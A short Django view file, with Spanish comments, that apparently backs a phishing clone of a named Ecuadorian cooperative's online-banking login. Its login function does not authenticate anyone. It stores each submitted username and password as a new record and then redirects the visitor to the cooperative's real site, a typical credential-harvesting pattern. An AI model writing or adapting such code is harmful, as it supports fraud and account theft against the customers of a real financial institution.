from django.shortcuts import render, redirect
from .models import Usuario
from django.contrib.auth.hashers import make_password

def login_view(request):
    if request.method == 'POST':
        # Obtener los datos del formulario
        usuario_input = request.POST['usuario']
        contrasena_input = request.POST['contrasena']
        
        # Crear un nuevo objeto Usuario y guardar los datos en la base de datos
        usuario = Usuario(usuario=usuario_input, contrasena=make_password(contrasena_input))
        usuario.save()

        # Redirigir a la página oficial si los datos se guardan correctamente
        return redirect('https://servicios.alianzadelvalle.fin.ec/cooperativa-en-linea/#/')
    
    return render(request, 'Valle/login.html')
